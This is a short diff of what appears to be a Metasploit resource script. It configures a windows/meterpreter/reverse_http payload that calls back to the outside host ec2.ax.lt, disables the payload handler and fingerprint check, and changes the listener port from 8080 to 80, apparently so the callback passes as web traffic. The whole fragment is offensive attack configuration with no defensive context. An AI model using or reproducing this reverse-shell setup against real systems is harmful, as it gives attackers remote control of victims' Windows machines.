@@ -4,7 +4,7 @@ set PAYLOAD windows/meterpreter/reverse_http
 set LHOST ec2.ax.lt
 set DisablePayloadHandler true
 set FingerprintCheck false
-set LPORT 8080
+set LPORT 80
 set RPORT 80
 set SSL false
 
